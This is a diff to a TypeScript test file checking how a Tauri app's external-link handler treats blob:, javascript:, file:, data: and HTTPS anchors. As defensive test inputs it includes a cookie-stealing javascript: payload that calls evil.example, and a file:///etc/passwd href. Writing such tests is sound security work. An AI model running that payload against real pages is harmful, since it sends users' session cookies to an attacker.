@@ -19,9 +19,15 @@ vi.mock("@tauri-apps/plugin-opener", () => {
 
 import { FIRST_PARTY_ORIGINS, installTauriExternalLinkHandler } from "../externalLinks";
 
-function click(href: string, nested = false, init: MouseEventInit = {}): MouseEvent {
+function click(
+  href: string,
+  nested = false,
+  init: MouseEventInit = {},
+  attrs: Record<string, string> = {},
+): MouseEvent {
   const anchor = document.createElement("a");
   anchor.setAttribute("href", href);
+  for (const [name, value] of Object.entries(attrs)) anchor.setAttribute(name, value);
   const target = nested ? document.createElement("span") : anchor;
   if (nested) anchor.append(target);
   document.body.append(anchor);
@@ -109,6 +115,46 @@ describe("Tauri document external-link routing", () => {
   ])("preserves first-party remote-shell navigation for %s", (url) => {
     expect(click(url).defaultPrevented).toBe(false);
     expect(mocks.openUrl).not.toHaveBeenCalled();
+  });
+
+  // A blob: href is the page's own bytes -- a file save -- not a link the shell
+  // could open. Cancelling it cancels the download itself, which is what
+  // silently ate every desktop export.
+  it("leaves a blob: download anchor to the browser's default action", () => {
+    const event = click(
+      `blob:${window.location.origin}/0f8a4c21-download`,
+      false,
+      {},
+      { download: "game-state.zip" },
+    );
+
+    expect(event.defaultPrevented).toBe(false);
+    expect(mocks.openUrl).not.toHaveBeenCalled();
+  });
+
+  it.each([
+    "javascript:fetch('https://evil.example/'+document.cookie)",
+    "file:///etc/passwd",
+    "data:text/plain;base64,cGhhc2U=",
+  ])(
+    "denies %s despite its download attribute, which a download-attribute predicate would admit",
+    (href) => {
+      // Browsers ignore `download` on a javascript: URL and run the script, so
+      // the admitted set is keyed on the scheme, never on the attribute. data:
+      // stays out of it because the shell's navigation guard spares only blob:,
+      // so admitting it would let a data: click abort the running game.
+      const event = click(href, false, {}, { download: "notes.txt" });
+
+      expect(event.defaultPrevented).toBe(true);
+      expect(mocks.openUrl).not.toHaveBeenCalled();
+    },
+  );
+
+  it("still routes an external HTTPS anchor through the opener when it carries a download attribute", async () => {
+    const event = click("https://example.com/cards", false, {}, { download: "cards.html" });
+
+    expect(event.defaultPrevented).toBe(true);
+    await vi.waitFor(() => expect(mocks.openUrl).toHaveBeenCalledWith("https://example.com/cards"));
   });
 
   it("installs only once", () => {
